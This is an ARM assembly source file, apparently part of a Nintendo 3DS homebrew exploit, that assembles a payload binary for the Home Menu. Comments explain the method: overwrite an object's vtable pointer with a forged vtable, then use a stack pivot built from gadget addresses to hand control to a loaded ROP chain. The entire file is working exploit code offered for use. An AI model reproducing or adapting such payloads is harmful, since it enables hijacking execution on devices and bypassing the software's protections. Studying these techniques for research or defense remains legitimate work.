.nds

.include "../build/constants.s"

.create "menu_payload_loadropbin.bin",0x0

MENU_OBJECT_LOC equ 0xBABE0000 ; for relocation

; basically we overwrite an object's data to get home menu to do what we want
; first we overwrite the vtable pointer so that we can get the code to jump to where we want
; the method we use for that is located at vtable + 0x8
; with that we can put a in our vtable to our stack pivot
; our stack pivot works by loading a bunch of registers from [r4]
; fortunately we know r4 = object + 0x4, so we manufacture our object accordingly
; and then we get ROP under home menu !

.orga 0x0

	object:
		.word MENU_OBJECT_LOC + vtable - object ; pointer to manufactured vtable, and new sp
		.word ROP_MENU_POP_PC ; pc (pop {pc} to jump to ROP)

		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten

	vtable: ; also initial ROP
		.word ROP_MENU_POP_R4R5PC ; pop {r4, r5, pc} : skip pivot
			.word MENU_OBJECT_LOC + ropload_stackpivot - object + 0x1c ; r4
			.word ROP_MENU_STACK_PIVOT ; stack pivot ; also r5 (garbage)
	rop:
		.word ROP_MENU_STACK_PIVOT ; stack-pivot to the main ROP from the ropbin.

	ropload_stackpivot:
		.word 0, 0, 0, 0, 0, 0
		.word MENU_LOADEDROP_BUFADR ; sp
		.word ROP_MENU_POP_PC ; pc

	.fill ((object + 0x60) - .), 0x0

.Close
